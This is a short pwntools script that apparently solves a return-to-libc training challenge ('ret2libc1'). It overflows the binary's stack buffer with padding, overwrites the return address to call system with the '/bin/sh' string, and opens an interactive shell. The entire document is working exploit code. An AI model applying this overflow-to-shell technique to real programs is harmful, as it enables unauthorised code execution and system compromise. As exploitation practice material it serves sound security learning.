from pwn import *
p = process("./ret2libc1")
elf = p.elf
system = 0x8048466
bin_sh = next(elf.search(b"/bin/sh"))
p.sendline(b"a"*0x70 + b''.join(p32(i) for i in [system, 0, bin_sh]))
p.interactive()